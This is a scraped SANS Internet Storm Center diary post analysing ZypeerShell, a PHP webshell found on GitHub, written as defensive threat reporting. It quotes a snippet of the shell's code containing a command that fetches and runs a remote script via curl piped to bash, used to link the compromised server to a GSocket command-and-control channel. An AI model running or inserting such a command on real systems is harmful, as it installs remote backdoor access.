---
ai_commentary: []
ai_commentary_meta:
  content_digest: ''
  generated_at: ''
  model: ''
  prompt_version: ''
  provider: ''
category: ai-security
date: '2026-06-23T04:30:32.691188+00:00'
exported_at: '2026-06-23T04:30:36.798713+00:00'
feed: https://isc.sans.edu/rssfeed.xml
language: en
source_url: https://isc.sans.edu/diary/rss/33096
structured_data:
  about: []
  author: ''
  description: 'Webshells Remain Popular, Author: Xavier Mertens'
  headline: Webshells Remain Popular, (Mon, Jun 22nd)
  inLanguage: en
  keywords: []
  main_image: ''
  original_source: https://isc.sans.edu/diary/rss/33096
  publisher:
    logo: /favicon.ico
    name: GTCode
title: Webshells Remain Popular, (Mon, Jun 22nd)
updated_at: '2026-06-23T04:30:32.691188+00:00'
url_hash: ebe2fc7bed8d604d94f1d3adbd9ca9fc796f51a5
---

Webshells have been popular for a long time. We already covered this topic across multiple diaries[
[1](https://isc.sans.edu/diary/Webshells+Webshells+everywhere/28106)
][
[2](https://isc.sans.edu/diary/Webshell+looking+for+interesting+files/23567)
]. I spent some time to track them[
[3](https://owasp.org/www-chapter-belgium/assets/2017/2017-05-29/2017-05-29_OWASP-BE_HTTPForTheGoodOrTheBad.pdf)
] and slighly paid less attention to them but today I found another one. It seems to be a new player (pushed on Github two months ago).

The webshell is called ZypeerShell[
[4](https://github.com/sagsooz/ZypeerShell)
] and pretend to be "The most powerful, undetectable, and feature-rich PHP webshell available on GitHub.". The shell is classic and provides most of the expected features for such tool:

![](https://isc.sans.edu/diaryimages/images/isc-20260622-1.png)

I won't review all the features because they are classic. In the webshell version I found, some functions were present but never called from the GUI. By example, the function zypeergsdeploy() helps to connect to a C2 server through GSocket

```
function zypeergsdeploy() {
    zypeerhead();

    echo '&lt;div class="header"&gt;&lt;center&gt;&lt;p&gt;&lt;div class="txtfont_header"&gt;| GSocket Deploy Tool |&lt;/div&gt;&lt;/p&gt;&lt;/center&gt;&lt;br&gt;';

    echo '&lt;div style="text-align:center;max-width:800px;margin:20px auto;color:#ccc;"&gt;';
    echo 'This tool runs the official GSocket installation command:&lt;br&gt;';
    echo '&lt;code style="background:#222;padding:8px 12px;font-size:15px;"&gt;bash -c "$(curl -fsSL https://gsocket.io/y)"&lt;/code&gt;&lt;br&gt;&lt;br&gt;';
    echo 'After installation, it will show a secret token and connection command (like gs-netcat -s "XXXX" -i).&lt;br&gt;';
    echo 'Click "Run" below to execute it directly.';
    echo '&lt;/div&gt;&lt;br&gt;&lt;hr&gt;&lt;br&gt;';

    if (!isset($_POST['zypeer3']) || $_POST['zypeer3'] !== '&gt;&gt;') {
    [...]
```

This function is never called!

Note that the Github repository contains a version obfusctated with Fortress Layer, a multi-layer loader with integrity checks. Zypeer is also referenced as a red-team tool on a Telegram channel:

![](https://isc.sans.edu/diaryimages/images/isc-20260622-2.png)
???????

[1]
&lt;https://isc.sans.edu/diary/Webshells+Webshells+everywhere/28106&gt;

[2]
&lt;https://isc.sans.edu/diary/Webshell+looking+for+interesting+files/23567&gt;

[3]
[https://owasp.org/www-chapter-belgium/assets/2017/2017-05-29/2017-05-29\_OWASP-BE\_HTTPForTheGoodOrTheBad.pdf???????](https://owasp.org/www-chapter-belgium/assets/2017/2017-05-29/2017-05-29_OWASP-BE_HTTPForTheGoodOrTheBad.pdf)

[4]
[https://github.com/sagsooz/ZypeerShell???????](https://github.com/sagsooz/ZypeerShell)

**Xavier Mertens (@xme)**

Xameco

Senior ISC Handler - Freelance Cyber Security Consultant

[PGP Key](https://raw.githubusercontent.com/xme/pgp/refs/heads/main/public.key)